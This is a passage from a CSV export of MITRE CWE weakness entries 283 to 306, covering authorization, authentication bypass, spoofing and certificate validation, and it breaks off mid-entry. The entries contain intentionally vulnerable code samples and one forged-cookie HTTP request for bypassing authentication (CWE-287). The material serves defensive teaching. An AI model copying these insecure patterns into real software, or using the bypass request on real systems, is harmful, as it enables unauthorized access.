CWE-283: Unverified Ownership,The product does not properly verify that a critical resource is owned by the proper entity.,"Scope: Access Control, Impact: Technical Impact:Gain Privileges or Assume IdentityAn attacker could gain unauthorized access to system resources., Likelihood: ","Example 1This function is part of a privileged program that takes input from users with potentially lower privileges.(bad code)Example Language:Pythondef killProcess(processID):os.kill(processID, signal.SIGKILL)This code does not confirm that the process to be killed is owned by the requesting user, thus allowing an attacker to kill arbitrary processes.This function remedies the problem by checking the owner of the process before killing it:(good code)Example Language:Pythondef killProcess(processID):user = getCurrentUser()#Check process owner against requesting userif getProcessOwner(processID) == user:os.kill(processID, signal.SIGKILL)returnelse:print(""You cannot kill a process you don't own"")return","Phases:  Architecture and Design; OperationVery carefully manage the setting, management, and handling of privileges. Explicitly manage trust zones in the software.Phase:  Architecture and DesignStrategy:  Separation of PrivilegeConsider following the principle of separation of privilege. Require multiple conditions to be met before permitting access to a system resource."
CWE-284: Improper Access Control,The product does not restrict or incorrectly restricts access to a resource from an unauthorized actor.,"Scope: Other, Impact: Technical Impact:Varies by Context, Likelihood: ",无示范例子,"Phases:  Architecture and Design; OperationVery carefully manage the setting, management, and handling of privileges. Explicitly manage trust zones in the software.Phase:  Architecture and DesignStrategy:  Separation of PrivilegeCompartmentalize the system to have ""safe"" areas where trust boundaries can be unambiguously drawn. Do not allow sensitive data to go outside of the trust boundary and always be careful when interfacing with a compartment outside of the safe area.Ensure that appropriate compartmentalization is built into the system design, and the compartmentalization allows for and reinforces privilege separation functionality. Architects and designers should rely on the principle of least privilege to decide the appropriate time to use privileges and the time to drop privileges."
CWE-285: Improper Authorization,The product does not perform or incorrectly performs an authorization check when an actor attempts to access a resource or perform an action.,"Scope: Confidentiality, Impact: Technical Impact:Read Application Data; Read Files or DirectoriesAn attacker could read sensitive data, either by reading the data directly from a data store that is not properly restricted, or by accessing insufficiently-protected, privileged functionality to read the data., Likelihood: ; Scope: Integrity, Impact: Technical Impact:Modify Application Data; Modify Files or DirectoriesAn attacker could modify sensitive data, either by writing the data directly to a data store that is not properly restricted, or by accessing insufficiently-protected, privileged functionality to write the data., Likelihood: ; Scope: Access Control, Impact: Technical Impact:Gain Privileges or Assume IdentityAn attacker could gain privileges by modifying or reading critical data directly, or by accessing insufficiently-protected, privileged functionality., Likelihood: ","Example 1This function runs an arbitrary SQL query on a given database, returning the result of the query.(bad code)Example Language:PHPfunction runEmployeeQuery($dbName, $name){mysql_select_db($dbName,$globalDbHandle) or die(""Could not open Database"".$dbName);//Use a prepared statement to avoidCWE-89$preparedStatement = $globalDbHandle->prepare('SELECT * FROM employees WHERE name = :name');$preparedStatement->execute(array(':name' => $name));return $preparedStatement->fetchAll();}/.../$employeeRecord = runEmployeeQuery('EmployeeDB',$_GET['EmployeeName']);While this code is careful to avoid SQL Injection, the function does not confirm the user sending the query is authorized to do so. An attacker may be able to obtain sensitive employee information from the database.Example 2The following program could be part of a bulletin board system that allows users to send private messages to each other. This program intends to authenticate the user before deciding whether a private message should be displayed. Assume that LookupMessageObject() ensures that the $id argument is numeric, constructs a filename based on that id, and reads the message details from that file. Also assume that the program stores all private messages for all users in the same directory.(bad code)Example Language:Perlsub DisplayPrivateMessage {my($id) = @_;my $Message = LookupMessageObject($id);print ""From: "" . encodeHTML($Message->{from}) . ""<br>\n"";print ""Subject: "" . encodeHTML($Message->{subject}) . ""\n"";print ""<hr>\n"";print ""Body: "" . encodeHTML($Message->{body}) . ""\n"";}my $q = new CGI;# For purposes of this example, assume thatCWE-309and#CWE-523do not apply.if (! AuthenticateUser($q->param('username'), $q->param('password'))) {ExitError(""invalid username or password"");}my $id = $q->param('id');DisplayPrivateMessage($id);While the program properly exits if authentication fails, it does not ensure that the message is addressed to the user. As a result, an authenticated attacker could provide any arbitrary identifier and read private messages that were intended for other users.One way to avoid this problem would be to ensure that the ""to"" field in the message object matches the username of the authenticated user.","Phase:  Architecture and DesignDivide the product into anonymous, normal, privileged, and administrative areas. Reduce the attack surface by carefully mapping roles with data and functionality. Use role-based access control (RBAC) to enforce the roles at the appropriate boundaries.Note that this approach may not protect against horizontal authorization, i.e., it will not protect a user from attacking others with the same role.Phase:  Architecture and DesignEnsure that you perform access control checks related to your business logic. These checks may be different than the access control checks that you apply to more generic resources such as files, connections, processes, memory, and database records. For example, a database may restrict access for medical records to a specific database user, but each record might only be intended to be accessible to the patient and the patient's doctor.Phase:  Architecture and DesignStrategy:  Libraries or FrameworksUse a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.For example, consider using authorization frameworks such as the JAAS Authorization Framework [REF-233] and the OWASP ESAPI Access Control feature [REF-45].Phase:  Architecture and DesignFor web applications, make sure that the access control mechanism is enforced correctly at the server side on every page. Users should not be able to access any unauthorized functionality or information by simply requesting direct access to that page.One way to do this is to ensure that all pages containing sensitive information are not cached, and that all such pages restrict access to requests that are accompanied by an active and authenticated session token associated with a user who has the required permissions to access that page.Phases:  System Configuration; InstallationUse the access control capabilities of your operating system and server environment and define your access control lists accordingly. Use a ""default deny"" policy when defining these ACLs."
CWE-286: Incorrect User Management,The product does not properly manage a user within its environment.,"Scope: Other, Impact: Technical Impact:Varies by Context, Likelihood: ",无示范例子,无可能的缓解方案
CWE-287: Improper Authentication,"When an actor claims to have a given identity, the product does not prove or insufficiently proves that the claim is correct.","Scope: IntegrityConfidentialityAvailabilityAccess Control, Impact: Technical Impact:Read Application Data; Gain Privileges or Assume Identity; Execute Unauthorized Code or CommandsThis weakness can lead to the exposure of resources or functionality to unintended actors, possibly providing attackers with sensitive information or even execute arbitrary code., Likelihood: ","Example 1The following code intends to ensure that the user is already logged in. If not, the code performs authentication with the user-provided username and password. If successful, it sets the loggedin and user cookies to ""remember"" that the user has already logged in. Finally, the code performs administrator tasks if the logged-in user has the ""Administrator"" username, as recorded in the user cookie.(bad code)Example Language:Perlmy $q = new CGI;if ($q->cookie('loggedin') ne ""true"") {if (! AuthenticateUser($q->param('username'), $q->param('password'))) {ExitError(""Error: you need to log in first"");}else {# Set loggedin and user cookies.$q->cookie(-name => 'loggedin',-value => 'true');$q->cookie(-name => 'user',-value => $q->param('username'));}}if ($q->cookie('user') eq ""Administrator"") {DoAdministratorTasks();}Unfortunately, this code can be bypassed. The attacker can set the cookies independently so that the code does not check the username and password. The attacker could do this with an HTTP request containing headers such as:(attack code)GET /cgi-bin/vulnerable.cgi HTTP/1.1Cookie: user=AdministratorCookie: loggedin=true[body of request]By setting the loggedin cookie to ""true"", the attacker bypasses the entire authentication check. By using the ""Administrator"" value in the user cookie, the attacker also gains privileges to administer the software.Example 2In January 2009, an attacker was able to gain administrator access to a Twitter server because the server did not restrict the number of login attempts [REF-236]. The attacker targeted a member of Twitter's support team and was able to successfully guess the member's password using a brute force attack by guessing a large number of common words. After gaining access as the member of the support staff, the attacker used the administrator panel to gain access to 33 accounts that belonged to celebrities and politicians. Ultimately, fake Twitter messages were sent that appeared to come from the compromised accounts.Example 2 References:[REF-236] Kim Zetter. ""Weak Password Brings 'Happiness' to Twitter Hacker"". 2009-01-09. 
				<https://www.wired.com/2009/01/professed-twitt/>.URL validated: 2023-04-07.Example 3In 2022, the OT:ICEFALL study examined products by 10 different Operational Technology (OT) vendors. The researchers reported 56 vulnerabilities and said that the products were ""insecure by design"" [REF-1283]. If exploited, these vulnerabilities often allowed adversaries to change how the products operated, ranging from denial of service to changing the code that the products executed. Since these products were often used in industries such as power, electrical, water, and others, there could even be safety implications.Multiple vendors did not use any authentication or used client-side authentication for critical functionality in their OT products.",Phase:  Architecture and DesignStrategy:  Libraries or FrameworksUse an authentication framework or library such as the OWASP ESAPI Authentication feature.
CWE-288: Authentication Bypass Using an Alternate Path or Channel,"A product requires authentication, but the product has an alternate path or channel that does not require authentication.","Scope: Access Control, Impact: Technical Impact:Bypass Protection Mechanism, Likelihood: ","Example 1Register SECURE_ME is located at address 0xF00. A
                 mirror of this register called COPY_OF_SECURE_ME is
                 at location 0x800F00. The register SECURE_ME is
                 protected from malicious agents and only allows
                 access to select, while COPY_OF_SECURE_ME is not.Access control is implemented using an allowlist (as
                 indicated by acl_oh_allowlist). The identity of the
                 initiator of the transaction is indicated by the
                 one hot input, incoming_id. This is checked against
                 the acl_oh_allowlist (which contains a list of
                 initiators that are allowed to access the asset).Though this example is shown in Verilog, it will
                 apply to VHDL as well.(informative)Example Language:Verilogmodule foo_bar(data_out, data_in, incoming_id, address, clk, rst_n);output [31:0] data_out;input [31:0] data_in, incoming_id, address;input clk, rst_n;wire write_auth, addr_auth;reg [31:0] data_out, acl_oh_allowlist, q;assign write_auth = | (incoming_id & acl_oh_allowlist) ? 1 : 0;always @*acl_oh_allowlist <= 32'h8312;assign addr_auth = (address == 32'hF00) ? 1: 0;always @ (posedge clk or negedge rst_n)if (!rst_n)beginq <= 32'h0;data_out <= 32'h0;endelsebeginq <= (addr_auth & write_auth) ? data_in: q;data_out <= q;endendendmodule(bad code)Example Language:Verilogassign addr_auth = (address == 32'hF00) ? 1: 0;The bugged line of code is repeated in the Bad
             example above. Weakness arises from the fact that the
             SECURE_ME register can be modified by writing to the
             shadow register COPY_OF_SECURE_ME, the address of
             COPY_OF_SECURE_ME should also be included in the check.
             That buggy line of code should instead be replaced as
             shown in the Good Code Snippet below.(good code)Example Language:Verilogassign addr_auth = (address == 32'hF00 || address == 32'h800F00) ? 1: 0;","Phase:  Architecture and DesignFunnel all access through a single choke point to simplify how users can access a resource. For every access, perform a check to determine if the user has permissions to access the resource."
CWE-289: Authentication Bypass by Alternate Name,"The product performs authentication based on the name of a resource being accessed, or the name of the actor performing the access, but it does not properly check all possible names for that resource or actor.","Scope: Access Control, Impact: Technical Impact:Bypass Protection Mechanism, Likelihood: ",无示范例子,"Phase:  Architecture and DesignStrategy:  Input ValidationAvoid making decisions based on names of resources (e.g. files) if those resources can have alternate names.Phase:  ImplementationStrategy:  Input ValidationAssume all input is malicious. Use an ""accept known good"" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, ""boat"" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as ""red"" or ""blue.""Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.Phase:  ImplementationStrategy:  Input ValidationInputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass allowlist validation schemes by introducing dangerous inputs after they have been checked."
CWE-290: Authentication Bypass by Spoofing,This attack-focused weakness is caused by incorrectly implemented authentication schemes that are subject to spoofing attacks.,"Scope: Access Control, Impact: Technical Impact:Bypass Protection Mechanism; Gain Privileges or Assume IdentityThis weakness can allow an attacker to access resources which are not otherwise accessible without proper authentication., Likelihood: ","Example 1The following code authenticates users.(bad code)Example Language:JavaString sourceIP = request.getRemoteAddr();if (sourceIP != null && sourceIP.equals(APPROVED_IP)) {authenticated = true;}The authentication mechanism implemented relies on an IP address for source validation. If an attacker is able to spoof the IP, they may be able to bypass the authentication mechanism.Example 2Both of these examples check if a request is from a trusted address before responding to the request.(bad code)Example Language:Csd = socket(AF_INET, SOCK_DGRAM, 0);serv.sin_family = AF_INET;serv.sin_addr.s_addr = htonl(INADDR_ANY);servr.sin_port = htons(1008);bind(sd, (struct sockaddr *) & serv, sizeof(serv));while (1) {memset(msg, 0x0, MAX_MSG);clilen = sizeof(cli);if (inet_ntoa(cli.sin_addr)==getTrustedAddress()) {n = recvfrom(sd, msg, MAX_MSG, 0, (struct sockaddr *) & cli, &clilen);}}(bad code)Example Language:Javawhile(true) {DatagramPacket rp=new DatagramPacket(rData,rData.length);outSock.receive(rp);String in = new String(p.getData(),0, rp.getLength());InetAddress clientIPAddress = rp.getAddress();int port = rp.getPort();if (isTrustedAddress(clientIPAddress) & secretKey.equals(in)) {out = secret.getBytes();DatagramPacket sp =new DatagramPacket(out,out.length, IPAddress, port); outSock.send(sp);}}The code only verifies the address as stored in the request packet. An attacker can spoof this address, thus impersonating a trusted client.Example 3The following code samples use a DNS lookup in order to decide whether or not an inbound request is from a trusted host. If an attacker can poison the DNS cache, they can gain trusted status.(bad code)Example Language:Cstruct hostent *hp;struct in_addr myaddr;char* tHost = ""trustme.example.com"";myaddr.s_addr=inet_addr(ip_addr_string);hp = gethostbyaddr((char *) &myaddr, sizeof(struct in_addr), AF_INET);if (hp && !strncmp(hp->h_name, tHost, sizeof(tHost))) {trusted = true;} else {trusted = false;}(bad code)Example Language:JavaString ip = request.getRemoteAddr();InetAddress addr = InetAddress.getByName(ip);if (addr.getCanonicalHostName().endsWith(""trustme.com"")) {trusted = true;}(bad code)Example Language:C#IPAddress hostIPAddress = IPAddress.Parse(RemoteIpAddress);IPHostEntry hostInfo = Dns.GetHostByAddress(hostIPAddress);if (hostInfo.HostName.EndsWith(""trustme.com"")) {trusted = true;}IP addresses are more reliable than DNS names, but they can also be spoofed. Attackers can easily forge the source IP address of the packets they send, but response packets will return to the forged IP address. To see the response packets, the attacker has to sniff the traffic between the victim machine and the forged IP address. In order to accomplish the required sniffing, attackers typically attempt to locate themselves on the same subnet as the victim machine. Attackers may be able to circumvent this requirement by using source routing, but source routing is disabled across much of the Internet today. In summary, IP address verification can be a useful part of an authentication scheme, but it should not be the single factor required for authentication.",无可能的缓解方案
CWE-291: Reliance on IP Address for Authentication,The product uses an IP address for authentication.,"Scope: Access ControlNon-Repudiation, Impact: Technical Impact:Hide Activities; Gain Privileges or Assume IdentityMalicious users can fake authentication information, impersonating any IP address., Likelihood: ","Example 1Both of these examples check if a request is from a trusted address before responding to the request.(bad code)Example Language:Csd = socket(AF_INET, SOCK_DGRAM, 0);serv.sin_family = AF_INET;serv.sin_addr.s_addr = htonl(INADDR_ANY);servr.sin_port = htons(1008);bind(sd, (struct sockaddr *) & serv, sizeof(serv));while (1) {memset(msg, 0x0, MAX_MSG);clilen = sizeof(cli);if (inet_ntoa(cli.sin_addr)==getTrustedAddress()) {n = recvfrom(sd, msg, MAX_MSG, 0, (struct sockaddr *) & cli, &clilen);}}(bad code)Example Language:Javawhile(true) {DatagramPacket rp=new DatagramPacket(rData,rData.length);outSock.receive(rp);String in = new String(p.getData(),0, rp.getLength());InetAddress clientIPAddress = rp.getAddress();int port = rp.getPort();if (isTrustedAddress(clientIPAddress) & secretKey.equals(in)) {out = secret.getBytes();DatagramPacket sp =new DatagramPacket(out,out.length, IPAddress, port); outSock.send(sp);}}The code only verifies the address as stored in the request packet. An attacker can spoof this address, thus impersonating a trusted client.",Phase:  Architecture and DesignUse other means of identity verification that cannot be simply spoofed. Possibilities include a username/password or certificate.
CWE-292: DEPRECATED: Trusting Self-reported DNS Name,This entry has been deprecated because it was a duplicate ofCWE-350. All content has been transferred toCWE-350.,无常见后果信息,无示范例子,无可能的缓解方案
CWE-293: Using Referer Field for Authentication,"The referer field in HTTP requests can be easily modified and, as such, is not a valid means of message integrity checking.","Scope: Access Control, Impact: Technical Impact:Gain Privileges or Assume IdentityActions, which may not be authorized otherwise, can be carried out as if they were validated by the server referred to., Likelihood: ","Example 1The following code samples check a packet's referer in order to decide whether or not an inbound request is from a trusted host.(bad code)Example Language:C++String trustedReferer = ""http://www.example.com/""while(true){n = read(newsock, buffer, BUFSIZE);requestPacket = processPacket(buffer, n);if (requestPacket.referer == trustedReferer){openNewSecureSession(requestPacket);}}(bad code)Example Language:Javaboolean processConnectionRequest(HttpServletRequest request){String referer = request.getHeader(""referer"")String trustedReferer = ""http://www.example.com/""if(referer.equals(trustedReferer)){openPrivilegedConnection(request);return true;}else{sendPrivilegeError(request);return false;}}These examples check if a request is from a trusted referer before responding to a request, but the code only verifies the referer name as stored in the request packet. An attacker can spoof the referer, thus impersonating a trusted client.","Phase:  Architecture and DesignIn order to usefully check if a given action is authorized, some means of strong authentication and method protection must be used. Use other means of authorization that cannot be simply spoofed. Possibilities include a username/password or certificate."
CWE-294: Authentication Bypass by Capture-replay,A capture-replay flaw exists when the design of the product makes it possible for a malicious user to sniff network traffic and bypass authentication by replaying it to the server in question to the same effect as the original message (or with minor changes).,"Scope: Access Control, Impact: Technical Impact:Gain Privileges or Assume IdentityMessages sent with a capture-relay attack allow access to resources which are not otherwise accessible without proper authentication., Likelihood: ",无示范例子,"Phase:  Architecture and DesignUtilize some sequence or time stamping functionality along with a checksum which takes this into account in order to ensure that messages can be parsed only once.Phase:  Architecture and DesignSince any attacker who can listen to traffic can see sequence numbers, it is necessary to sign messages with some kind of cryptography to ensure that sequence numbers are not simply doctored along with content."
CWE-295: Improper Certificate Validation,"The product does not validate, or incorrectly validates, a certificate.","Scope: IntegrityAuthentication, Impact: Technical Impact:Bypass Protection Mechanism; Gain Privileges or Assume Identity, Likelihood: ","Example 1This code checks the certificate of a connected peer.(bad code)Example Language:Cif ((cert = SSL_get_peer_certificate(ssl)) && host)foo=SSL_get_verify_result(ssl);if ((X509_V_OK==foo) || X509_V_ERR_SELF_SIGNED_CERT_IN_CHAIN==foo))// certificate looks good, host can be trustedIn this case, because the certificate is self-signed, there was no external authority that could prove the identity of the host. The program could be communicating with a different system that is spoofing the host, e.g. by poisoning the DNS cache or using an Adversary-in-the-Middle (AITM) attack to modify the traffic from server to client.Example 2The following OpenSSL code obtains a certificate and verifies it.(bad code)Example Language:Ccert = SSL_get_peer_certificate(ssl);if (cert && (SSL_get_verify_result(ssl)==X509_V_OK)) {// do secret things}Even though the ""verify"" step returns X509_V_OK, this step does not include checking the Common Name against the name of the host. That is, there is no guarantee that the certificate is for the desired host. The SSL connection could have been established with a malicious host that provided a valid certificate.Example 3The following OpenSSL code ensures that there is a certificate and allows the use of expired certificates.(bad code)Example Language:Cif (cert = SSL_get_peer(certificate(ssl)) {foo=SSL_get_verify_result(ssl);if ((X509_V_OK==foo) || (X509_V_ERR_CERT_HAS_EXPIRED==foo))//do stuffIf the call to SSL_get_verify_result() returns X509_V_ERR_CERT_HAS_EXPIRED, this means that the certificate has expired. As time goes on, there is an increasing chance for attackers to compromise the certificate.Example 4The following OpenSSL code ensures that there is a certificate before continuing execution.(bad code)Example Language:Cif (cert = SSL_get_peer_certificate(ssl)) {// got a certificate, do secret thingsBecause this code does not use SSL_get_verify_results() to check the certificate, it could accept certificates that have been revoked (X509_V_ERR_CERT_REVOKED). The software could be communicating with a malicious host.Example 5The following OpenSSL code ensures that the host has a certificate.(bad code)Example Language:Cif (cert = SSL_get_peer_certificate(ssl)) {// got certificate, host can be trusted//foo=SSL_get_verify_result(ssl);//if (X509_V_OK==foo) ...}Note that the code does not call SSL_get_verify_result(ssl), which effectively disables the validation step that checks the certificate.","Phases:  Architecture and Design; ImplementationCertificates should be carefully managed and checked to assure that data are encrypted with the intended owner's public key.Phase:  ImplementationIf certificate pinning is being used, ensure that all relevant properties of the certificate are fully validated before the certificate is pinned, including the hostname."
CWE-296: Improper Following of a Certificate's Chain of Trust,"The product does not follow, or incorrectly follows, the chain of trust for a certificate back to a trusted root certificate, resulting in incorrect trust of any resource that is associated with that certificate.","Scope: Non-Repudiation, Impact: Technical Impact:Hide ActivitiesExploitation of this flaw can lead to the trust of data that may have originated with a spoofed source., Likelihood: ; Scope: IntegrityConfidentialityAvailabilityAccess Control, Impact: Technical Impact:Gain Privileges or Assume Identity; Execute Unauthorized Code or CommandsData, requests, or actions taken by the attacking entity can be carried out as a spoofed benign entity., Likelihood: ","Example 1This code checks the certificate of a connected peer.(bad code)Example Language:Cif ((cert = SSL_get_peer_certificate(ssl)) && host)foo=SSL_get_verify_result(ssl);if ((X509_V_OK==foo) || X509_V_ERR_SELF_SIGNED_CERT_IN_CHAIN==foo))// certificate looks good, host can be trustedIn this case, because the certificate is self-signed, there was no external authority that could prove the identity of the host. The program could be communicating with a different system that is spoofing the host, e.g. by poisoning the DNS cache or using an Adversary-in-the-Middle (AITM) attack to modify the traffic from server to client.","Phase:  Architecture and DesignEnsure that proper certificate checking is included in the system design.Phase:  ImplementationUnderstand, and properly implement all checks necessary to ensure the integrity of certificate trust integrity.Phase:  ImplementationIf certificate pinning is being used, ensure that all relevant properties of the certificate are fully validated before the certificate is pinned, including the full chain of trust."
CWE-297: Improper Validation of Certificate with Host Mismatch,"The product communicates with a host that provides a certificate, but the product does not properly ensure that the certificate is actually associated with that host.","Scope: Access Control, Impact: Technical Impact:Gain Privileges or Assume IdentityThe data read from the system vouched for by the certificate may not be from the expected system., Likelihood: ; Scope: AuthenticationOther, Impact: Technical Impact:OtherTrust afforded to the system in question - based on the malicious certificate - may allow for spoofing or redirection attacks., Likelihood: ","Example 1The following OpenSSL code obtains a certificate and verifies it.(bad code)Example Language:Ccert = SSL_get_peer_certificate(ssl);if (cert && (SSL_get_verify_result(ssl)==X509_V_OK)) {// do secret things}Even though the ""verify"" step returns X509_V_OK, this step does not include checking the Common Name against the name of the host. That is, there is no guarantee that the certificate is for the desired host. The SSL connection could have been established with a malicious host that provided a valid certificate.","Phase:  Architecture and DesignFully check the hostname of the certificate and provide the user with adequate information about the nature of the problem and how to proceed.Phase:  ImplementationIf certificate pinning is being used, ensure that all relevant properties of the certificate are fully validated before the certificate is pinned, including the hostname."
CWE-298: Improper Validation of Certificate Expiration,"A certificate expiration is not validated or is incorrectly validated, so trust may be assigned to certificates that have been abandoned due to age.","Scope: IntegrityOther, Impact: Technical Impact:OtherThe data read from the system vouched for by the expired certificate may be flawed due to malicious spoofing., Likelihood: ; Scope: AuthenticationOther, Impact: Technical Impact:OtherTrust afforded to the system in question - based on the expired certificate - may allow for spoofing attacks., Likelihood: ","Example 1The following OpenSSL code ensures that there is a certificate and allows the use of expired certificates.(bad code)Example Language:Cif (cert = SSL_get_peer(certificate(ssl)) {foo=SSL_get_verify_result(ssl);if ((X509_V_OK==foo) || (X509_V_ERR_CERT_HAS_EXPIRED==foo))//do stuffIf the call to SSL_get_verify_result() returns X509_V_ERR_CERT_HAS_EXPIRED, this means that the certificate has expired. As time goes on, there is an increasing chance for attackers to compromise the certificate.","Phase:  Architecture and DesignCheck for expired certificates and provide the user with adequate information about the nature of the problem and how to proceed.Phase:  ImplementationIf certificate pinning is being used, ensure that all relevant properties of the certificate are fully validated before the certificate is pinned, including the expiration."
CWE-299: Improper Check for Certificate Revocation,"The product does not check or incorrectly checks the revocation status of a certificate, which may cause it to use a certificate that has been compromised.","Scope: Access Control, Impact: Technical Impact:Gain Privileges or Assume IdentityTrust may be assigned to an entity who is not who it claims to be., Likelihood: ; Scope: IntegrityOther, Impact: Technical Impact:OtherData from an untrusted (and possibly malicious) source may be integrated., Likelihood: ; Scope: Confidentiality, Impact: Technical Impact:Read Application DataData may be disclosed to an entity impersonating a trusted entity, resulting in information disclosure., Likelihood: ","Example 1The following OpenSSL code ensures that there is a certificate before continuing execution.(bad code)Example Language:Cif (cert = SSL_get_peer_certificate(ssl)) {// got a certificate, do secret thingsBecause this code does not use SSL_get_verify_results() to check the certificate, it could accept certificates that have been revoked (X509_V_ERR_CERT_REVOKED). The product could be communicating with a malicious host.","Phase:  Architecture and DesignEnsure that certificates are checked for revoked status.Phase:  ImplementationIf certificate pinning is being used, ensure that all relevant properties of the certificate are fully validated before the certificate is pinned, including the revoked status."
CWE-300: Channel Accessible by Non-Endpoint,"The product does not adequately verify the identity of actors at both ends of a communication channel, or does not adequately ensure the integrity of the channel, in a way that allows the channel to be accessed or influenced by an actor that is not an endpoint.","Scope: ConfidentialityIntegrityAccess Control, Impact: Technical Impact:Read Application Data; Modify Application Data; Gain Privileges or Assume IdentityAn attacker could pose as one of the entities and read or possibly modify the communication., Likelihood: ","Example 1In the Java snippet below, data is sent over an unencrypted channel to a remote server.(bad code)Example Language:JavaSocket sock;PrintWriter out;try {sock = new Socket(REMOTE_HOST, REMOTE_PORT);out = new PrintWriter(echoSocket.getOutputStream(), true);// Write data to remote host via socket output stream....}By eavesdropping on the communication channel or posing as the endpoint, an attacker would be able to read all of the transmitted data.","Phase:  ImplementationAlways fully authenticate both ends of any communications channel.Phase:  Architecture and DesignAdhere to the principle of complete mediation.Phase:  ImplementationA certificate binds an identity to a cryptographic key to authenticate a communicating party. Often, the certificate takes the encrypted form of the hash of the identity of the subject, the public key, and information such as time of issue or expiration using the issuer's private key. The certificate can be validated by deciphering the certificate with the issuer's public key. See also X.509 certificate signature chains and the PGP certification structure."
CWE-301: Reflection Attack in an Authentication Protocol,Simple authentication protocols are subject to reflection attacks if a malicious user can use the target machine to impersonate a trusted user.,"Scope: Access Control, Impact: Technical Impact:Gain Privileges or Assume IdentityThe primary result of reflection attacks is successful authentication with a target machine -- as an impersonated user., Likelihood: ","Example 1The following example demonstrates the weakness.(bad code)Example Language:Cunsigned char *simple_digest(char *alg,char *buf,unsigned int len, int *olen) {const EVP_MD *m;EVP_MD_CTX ctx;unsigned char *ret;OpenSSL_add_all_digests();if (!(m = EVP_get_digestbyname(alg))) return NULL;if (!(ret = (unsigned char*)malloc(EVP_MAX_MD_SIZE))) return NULL;EVP_DigestInit(&ctx, m);EVP_DigestUpdate(&ctx,buf,len);EVP_DigestFinal(&ctx,ret,olen);return ret;}unsigned char *generate_password_and_cmd(char *password_and_cmd) {simple_digest(""sha1"",password,strlen(password_and_cmd)...);}(bad code)Example Language:JavaString command = new String(""some cmd to execute & the password"") MessageDigest encer = MessageDigest.getInstance(""SHA"");encer.update(command.getBytes(""UTF-8""));byte[] digest = encer.digest();",Phase:  Architecture and DesignUse different keys for the initiator and responder or of a different type of challenge for the initiator and responder.Phase:  Architecture and DesignLet the initiator prove its identity before proceeding.
CWE-302: Authentication Bypass by Assumed-Immutable Data,"The authentication scheme or implementation uses key data elements that are assumed to be immutable, but can be controlled or modified by the attacker.","Scope: Access Control, Impact: Technical Impact:Bypass Protection Mechanism, Likelihood: ","Example 1In the following example, an ""authenticated"" cookie is used to determine whether or not a user should be granted access to a system.(bad code)Example Language:Javaboolean authenticated = new Boolean(getCookieValue(""authenticated"")).booleanValue();if (authenticated) {...}Modifying the value of a cookie on the client-side is trivial, but many developers assume that cookies are essentially immutable.","Phases:  Architecture and Design; Operation; ImplementationImplement proper protection for immutable data (e.g. environment variable, hidden form fields, etc.)"
CWE-303: Incorrect Implementation of Authentication Algorithm,"The requirements for the product dictate the use of an established authentication algorithm, but the implementation of the algorithm is incorrect.","Scope: Access Control, Impact: Technical Impact:Bypass Protection Mechanism, Likelihood: ",无示范例子,无可能的缓解方案
CWE-304: Missing Critical Step in Authentication,"The product implements an authentication technique, but it skips a step that weakens the technique.","Scope: Access ControlIntegrityConfidentiality, Impact: Technical Impact:Bypass Protection Mechanism; Gain Privileges or Assume Identity; Read Application Data; Execute Unauthorized Code or CommandsThis weakness can lead to the exposure of resources or functionality to unintended actors, possibly providing attackers with sensitive information or allowing attackers to execute arbitrary code., Likelihood: ",无示范例子,无可能的缓解方案
CWE-305: Authentication Bypass by Primary Weakness,"The authentication algorithm is sound, but the implemented mechanism can be bypassed as the result of a separate weakness that is primary to the authentication error.","Scope: Access Control, Impact: Technical Impact:Bypass Protection Mechanism, Likelihood: ",无示范例子,无可能的缓解方案
CWE-306: Missing Authentication for Critical Function,The product does not perform any authentication for functionality that requires a provable user identity or consumes a significant amount of resources.,"Scope: Access ControlOther, Impact: Technical Impact:Gain Privileges or Assume Identity; OtherExposing critical functionality essentially provides an attacker with the privilege level of that functionality. The consequences will depend on the associated functionality, but they can range from reading or modifying sensitive data, access to administrative or other privileged functionality, or possibly even execution of arbitrary code., Likelihood: ","Example 1In the following Java example the method createBankAccount is used to create a BankAccount object for a bank management application.(bad code)Example Language:Javapublic BankAccount createBankAccount(String accountNumber, String accountType,String accountName, String accountSSN, double balance) {BankAccount account = new BankAccount();account.setAccountNumber(accountNumber);account.setAccountType(accountType);account.setAccountOwnerName(accountName);account.setAccountOwnerSSN(accountSSN);account.setBalance(balance);return account;}However, there is no authentication mechanism to ensure that the user creating this bank account object has the authority to create new bank accounts. Some authentication mechanisms should be used to verify that the user has the authority to create bank account objects.The following Java code includes a boolean variable and method for authenticating a user. If the user has not been authenticated then the createBankAccount will not create the bank account object.(good code)Example Language:Javaprivate boolean isUserAuthentic = false;// authenticate user,// if user is authenticated then set variable to true// otherwise set variable to falsepublic boolean authenticateUser(String username, String password) {...}public BankAccount createNewBankAccount(String accountNumber, String accountType,String accountName, String accountSSN, double balance) {BankAccount account = null;if (isUserAuthentic) {account = new BankAccount();account.setAccountNumber(accountNumber);account.setAccountType(accountType);account.setAccountOwnerName(accountName);account.setAccountOwnerSSN(accountSSN);account.setBalance(balance);}return account;}Example 2In 2022, the OT:ICEFALL study examined products by 10 different Operational Technology (OT) vendors. The researchers reported 56 vulnerabilities and said that the products were ""insecure by design"" [REF-1283]. If exploited, these vulnerabilities often allowed adversaries to change how the products operated, ranging from denial of service to changing the code that the products executed. Since these products were often used in industries such as power, electrical, water, and others, there could even be safety implications.Multiple vendors did not use any authentication for critical functionality in their OT products.Example 3In 2021, a web site operated by PeopleGIS stored data of US municipalities in Amazon Web Service (AWS) Simple Storage Service (S3) buckets.(bad code)Example Language:OtherA security researcher found 86 S3 buckets that could be accessed without authentication (CWE-306) and stored data unencrypted (CWE-312). These buckets exposed over 1000 GB of data and 1.6 million files including physical addresses, phone numbers, tax documents, pictures of driver's license IDs, etc. [REF-1296] [REF-1295]While it was not publicly disclosed how the data was protected after discovery, multiple options could have been considered.(good code)Example Language:OtherThe sensitive information could have been protected by ensuring that the buckets did not have public read access, e.g., by enabling the s3-account-level-public-access-blocks-periodic rule to 